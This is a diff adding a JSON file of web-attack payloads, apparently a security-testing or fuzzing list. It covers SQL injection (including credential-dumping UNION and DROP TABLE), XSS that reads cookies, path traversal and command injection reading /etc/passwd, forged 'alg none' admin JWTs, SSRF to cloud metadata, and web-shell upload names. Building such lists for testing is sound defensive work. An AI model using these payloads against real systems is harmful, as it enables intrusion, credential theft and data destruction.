@@ -1,0 +1,60 @@
+{
+  "sql_injection": [
+    "'",
+    "' OR '1'='1",
+    "' OR 1=1--",
+    "' UNION SELECT username,password FROM users--",
+    "'; DROP TABLE users;--",
+    "1 AND 1=1",
+    "1 AND 1=2",
+    "\" OR \"\"=\""
+  ],
+  "xss": [
+    "<script>alert(1)</script>",
+    "<img src=x onerror=alert(1)>",
+    "<svg/onload=alert(1)>",
+    "javascript:alert(1)",
+    "\"><script>alert(document.cookie)</script>"
+  ],
+  "path_traversal": [
+    "../../../etc/passwd",
+    "..\\..\\..\\windows\\win.ini",
+    "%2e%2e%2fetc%2fpasswd",
+    "/etc/passwd",
+    "....//....//etc/passwd"
+  ],
+  "command_injection": [
+    "; ls -la",
+    "| cat /etc/passwd",
+    "`id`",
+    "$(whoami)",
+    "&& whoami"
+  ],
+  "jwt_tamper": [
+    "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
+    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJ1c2VyIjoiMSJ9.fakesignature",
+    "null",
+    "Bearer null"
+  ],
+  "ssrf": [
+    "http://169.254.169.254/latest/meta-data/",
+    "http://127.0.0.1:8080/admin",
+    "http://localhost:6379",
+    "file:///etc/passwd",
+    "http://[::1]:80/"
+  ],
+  "file_upload": [
+    "shell.php",
+    "shell.php.png",
+    "evil.php%00.png",
+    "test.html",
+    "payload.jsp"
+  ],
+  "authorization_bypass": [
+    "admin",
+    "1",
+    "true",
+    "role=admin",
+    "userId=1"
+  ]
+}
